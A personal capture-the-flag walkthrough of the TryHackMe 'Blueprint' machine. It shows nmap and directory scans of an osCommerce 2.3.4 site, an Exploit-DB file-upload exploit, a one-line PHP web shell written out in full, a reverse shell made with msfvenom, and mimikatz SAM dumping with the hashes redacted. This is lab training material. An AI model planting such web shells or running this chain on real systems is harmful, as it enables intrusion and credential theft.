# Blueprint

This is a write-up for the machine on TryHackMe located at: [https://tryhackme.com/room/blueprint](https://tryhackme.com/room/blueprint).

The first thing I did was run an nmap scan:

```c
sudo nmap -Pn -T4 -A -sS -p- 10.10.21.26 -oN output
```

 This was my results from the scan:

```c
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 17:40 EDT
Nmap scan report for 10.10.21.26
Host is up (0.26s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/11%OT=80%CT=1%CU=42336%PV=Y%DS=4%DC=T%G=Y%TM=60EB693
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M5
OS:06NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 4 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m09s, deviation: 34m37s, median: -10s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:66:56:3b:ba:8d (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-11T22:56:59+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-11T21:56:58
|_  start_date: 2021-07-11T21:20:08

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   37.64 ms  10.6.0.1
2   ... 3
4   132.33 ms 10.10.21.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 995.72 seconds
```

The first thing I did was go to the websites on port 80 and 443 to see what is going on there. I got the following result:

![](../../.gitbook/assets/image%20%28126%29.png)

This seemed to be some sort of selling website so I was not sure if this is what I am looking for. Port 443 and 8080 lead me to the same result:

![](../../.gitbook/assets/image%20%28122%29.png)

I then ran **gobuster** on the "oscommerce" url and got the following result:

```c
gobuster dir -u http://10.10.21.26:8080/oscommerce-2.3.4/ -w ../resources/SecLists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.26:8080/oscommerce-2.3.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../resources/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/11 18:09:54 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 1044]
/.hta                 (Status: 403) [Size: 1044]
/.htpasswd            (Status: 403) [Size: 1044]
/aux                  (Status: 403) [Size: 1044]
/catalog              (Status: 301) [Size: 361] [--> http://10.10.21.26:8080/oscommerce-2.3.4/catalog/]
/com2                 (Status: 403) [Size: 1044]                                                       
/com3                 (Status: 403) [Size: 1044]                                                       
/com4                 (Status: 403) [Size: 1044]                                                       
/com1                 (Status: 403) [Size: 1044]                                                       
/con                  (Status: 403) [Size: 1044]                                                       
/docs                 (Status: 301) [Size: 358] [--> http://10.10.21.26:8080/oscommerce-2.3.4/docs/]   
/lpt1                 (Status: 403) [Size: 1044]                                                       
/lpt2                 (Status: 403) [Size: 1044]                                                       
/nul                  (Status: 403) [Size: 1044]                                                       
/prn                  (Status: 403) [Size: 1044]                                                       
                                                                                                       
===============================================================
2021/07/11 18:12:00 Finished
===============================================================
```

I was looking around the directories and did not find anything significant. A lot of the directories showed me the following page:

![](../../.gitbook/assets/image%20%28124%29.png)

I then viewed this [write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html), and realized that my search was missing the "Install" directory. I then ran a search using [feroxbuster,](https://github.com/epi052/feroxbuster) and I got the result so much quicker:

```c
[>-------------------] - 2m    369051/35278824 4h      found:150     errors:328839 
[###########>--------] - 2m    139024/239992  824/s   http://10.10.21.26:8080/oscommerce-2.3.4/
[###########>--------] - 2m    135880/239992  813/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog
[###########>--------] - 2m    137472/239992  822/s   http://10.10.21.26:8080/oscommerce-2.3.4/docs
[###########>--------] - 2m    136936/239992  821/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/includes
[##########>---------] - 2m    127784/239992  780/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/pub
[##########>---------] - 2m    131576/239992  804/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/install
[##########>---------] - 2m    131392/239992  802/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/images
[##########>---------] - 2m    130088/239992  806/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/Admin
[###########>--------] - 2m    137872/239992  864/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/includes/modules
[###########>--------] - 2m    136504/239992  857/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/Images
[###########>--------] - 2m    133424/239992  849/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/includes/classes
[##########>---------] - 2m    129936/239992  832/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/install/images
[##########>---------] - 2m    130256/239992  834/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/install/templates
[##########>---------] - 2m    130208/239992  833/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/install/includes
[##########>---------] - 2m    126328/239992  812/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/install/Images
[#########>----------] - 2m    119072/239992  773/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/ext
[##########>---------] - 2m    121480/239992  791/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/ext/modules
[##########>---------] - 2m    127736/239992  864/s   http://10.10.21.26:8080/oscommerce-2.3.4/Docs
[#########>----------] - 2m    118192/239992  804/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/Images/dvd
[#######>------------] - 1m     90280/239992  869/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/images/Default
[#####>--------------] - 1m     63352/239992  758/s   http://10.10.21.26:8080/oscommerce-2.3.4/catalog/Images/DVD

```

Here, I then saw the "Install" directory. This page was still the same as before:

![](../../.gitbook/assets/image%20%28123%29.png)

I then saw the same [write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html), and noticed that they used **searchsploit** in order to search for a vulnerability for the machine. I then got this result:

![](../../.gitbook/assets/image%20%28125%29.png)

I wanted to try out the **Arbitrary File Upload** first. To get this in my current directory, I ran the following commands:

```c
searchsploit -p php/webapps/43191.py #Shows the full path for the code
cp /usr/share/exploitdb/exploits/php/webapps/43191.py . #copies it to the local directory
```

I ran the code just by itself to see what parameters it was looking for:

![](../../.gitbook/assets/image%20%28132%29.png)

I noticed that I needed a target \(at least\), authentication, and file. I tried to enter in just the target argument. I then realized I did not have the username and password for the authentication. I then went back to the install page in the catalog directory:

![](../../.gitbook/assets/image%20%28130%29.png)

I then clicked on the **start** button to see what it did. I entered root for the username and the Database Name and then press continue:

![](../../.gitbook/assets/image%20%28120%29.png)

I tried **admin** for the Username, and I ran into an error. I then tried **root** and it worked! I then set the Online Store Settings like:

![](../../.gitbook/assets/image%20%28118%29.png)

All the previous setup for the commerce site was based off of [the same write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html). I then got the following page:

![](../../.gitbook/assets/image%20%28129%29.png)

I was then lost about where to go from here. I then looked at the write-up and learned that I had to upload a basic PHP file:

```php
<?php passthru($_GET['cmd']);
?>
```

I then ran the python file with the modules:

![](../../.gitbook/assets/image%20%28121%29.png)

I then realized I had made a mistake. In my python command, I had added a "/" in the URL when I was not supposed to do so. After that, I was successful:

![](../../.gitbook/assets/image%20%28127%29.png)

I will be honest, at this part, I had to look back at the write-up because I was out of the TryHackMe game for a while, and was not sure what to do. The next item I had to do was get a reverse shell on the machine.  In order to do this, I would have to use **msfvenom** in order to do so:

![](../../.gitbook/assets/image%20%28131%29.png)

Now I can run a **netcat** listener and then go to the webpage with the executable on it:

![](../../.gitbook/assets/image%20%28133%29.png)

I then ran systeminfo in order to gain information about the system. I then got the following result:

```php
Host Name:                 BLUEPRINT
OS Name:                   Microsoft Windows 7 Home Basic 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00346-OEM-8992752-50005
Original Install Date:     1/15/2017, 6:48:59 AM
System Boot Time:          7/11/2021, 10:19:59 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,317 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,112 MB
Virtual Memory: In Use:    983 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB976902
                           [03]: KB4012215
Network Card(s):           1 NIC(s) Installed.
                           [01]: Citrix PV Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.21.26
                                 [02]: fe80::1565:9838:2ad3:4231
```

I then had to upload mimikatz to the Windows machine. I had to first find the location of mikikatz on the machine:

![](../../.gitbook/assets/image%20%28117%29.png)

I was looking for the **mimikatz.exe** file. I then had to upload the file to the machine:

![](../../.gitbook/assets/image%20%28119%29.png)

I was then able to access **mimikatz** on the machine:

![](../../.gitbook/assets/image%20%28134%29.png)

I got the following output when I ran **lsadump::sam**:

```php
mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : <REDACTED>
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : <REDACTED>

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: <REDACTED>

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: <REDACTED>

```

Using [crackstation](https://crackstation.net/), I was able to crack one of the two hashes:

![](../../.gitbook/assets/image%20%28128%29.png)

This was the answer to one of the questions on the machine. The second answer was the root.txt file "password". I got to this through changing directory by "cd-ing" into the directory and then running the following command:

```php
C:\Users\Administrator\Desktop>type root.txt.txt
```

I then solved the room!

